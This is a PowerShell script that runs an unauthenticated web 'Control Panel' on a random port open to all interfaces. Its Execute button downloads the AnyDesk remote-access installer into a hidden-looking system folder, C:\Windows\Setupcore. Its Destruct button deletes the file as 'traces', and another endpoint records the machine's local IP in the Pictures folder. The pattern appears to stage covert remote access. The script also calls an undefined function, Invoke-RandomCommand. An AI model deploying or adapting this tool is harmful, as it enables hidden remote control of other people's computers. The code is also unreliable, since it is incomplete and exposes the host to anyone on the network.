# Generate a random port number
$port = Get-Random -Minimum 1024 -Maximum 65535

$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://+:$port/")
$listener.Start()
Write-Host "Listening on port $port..."
Write-Host "Access the web interface at: http://localhost:$port"

function Handle-Request {
    param ($context)
    $request = $context.Request
    $response = $context.Response

    try {
        if ($request.HttpMethod -eq 'GET') {
            $html = @"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Custom IP Control</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            overflow: hidden;
            background: linear-gradient(270deg, #74ebd5, #acb6e5);
            background-size: 200% 200%;
            animation: gradient 15s ease infinite;
        }
        @keyframes gradient {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        div {
            text-align: center;
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            margin: 10px;
            cursor: pointer;
            border: none;
            border-radius: 5px;
            background-color: #007BFF;
            color: white;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div>
        <h1>Control Panel</h1>
        <button onclick="execute()">Execute</button>
        <button onclick="destruct()">Destruct</button>
        <button onclick="randomAction()">Random Action</button>
        <p id="message"></p>
    </div>

    <script>
        function execute() {
            fetch('/execute', { method: 'POST' })
                .then(response => {
                    if (response.ok) {
                        document.getElementById('message').innerText = 'Execute Complete';
                    } else {
                        document.getElementById('message').innerText = 'Execute failed.';
                    }
                });
        }
        
        function destruct() {
            fetch('/destruct', { method: 'POST' })
                .then(response => {
                    if (response.ok) {
                        document.getElementById('message').innerText = 'Cleaned Successfully';
                    } else {
                        document.getElementById('message').innerText = 'Clean failed.';
                    }
                });
        }
        
        function randomAction() {
            fetch('/random', { method: 'POST' })
                .then(response => {
                    if (response.ok) {
                        alert('Random action triggered.');
                    } else {
                        alert('Random action failed.');
                    }
                });
        }
    </script>
</body>
</html>
"@
            $bytes = [System.Text.Encoding]::UTF8.GetBytes($html)
            $response.ContentType = "text/html"
            $response.ContentLength64 = $bytes.Length
            $response.OutputStream.Write($bytes, 0, $bytes.Length)
        } elseif ($request.HttpMethod -eq 'POST') {
            $url = $request.Url.AbsolutePath
            switch ($url) {
                '/execute' {
                    $anyDeskDownloadUrl = "https://anydesk.com/en/downloads/thank-you?dv=win_exe"
                    $anyDeskDownloadPath = "C:\Windows\Setupcore\AnyDeskSetup.exe"

                    try {
                        Invoke-WebRequest -Uri $anyDeskDownloadUrl -OutFile $anyDeskDownloadPath -ErrorAction Stop
                        Write-Host "Downloaded AnyDesk to: $anyDeskDownloadPath"
                        $response.StatusCode = 200
                    } catch {
                        Write-Host "Failed to download AnyDesk."
                        $response.StatusCode = 500
                    }
                }
                '/destruct' {
                    $anyDeskDownloadPath = "C:\Windows\Setupcore\AnyDeskSetup.exe"
                    
                    # Secure deletion logic
                    if (Test-Path $anyDeskDownloadPath) {
                        try {
                            Remove-Item -Path $anyDeskDownloadPath -Force
                            Write-Host "AnyDesk traces removed from: $anyDeskDownloadPath"
                            $response.StatusCode = 200
                        } catch {
                            Write-Host "Failed to remove AnyDesk."
                            $response.StatusCode = 500
                        }
                    } else {
                        Write-Host "No AnyDesk file found to remove."
                        $response.StatusCode = 404
                    }
                }
                '/random' {
                    # Invoke random command function
                    Invoke-RandomCommand
                    $response.StatusCode = 200
                }
                '/generateTextFile' {
                    Generate-TextFileWithLocalIP
                    $response.StatusCode = 200
                }
                default {
                    $response.StatusCode = 404
                }
            }
        }
    } catch {
        Write-Host "Error: $_"
        $response.StatusCode = 500
    } finally {
        $response.Close()
    }
}

function Generate-TextFileWithLocalIP {
    try {
        $localIP = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
        $fileContent = "Local IP Address: $localIP"
        $filePath = "$env:USERPROFILE\Pictures\LocalIP.txt"
        Set-Content -Path $filePath -Value $fileContent -Force
        Write-Host "Generated text file with local IP address at: $filePath"
    } catch {
        Write-Host "Failed to generate text file with local IP address."
    }
}

while ($true) {
    $context = $listener.GetContext()
    Handle-Request $context
}
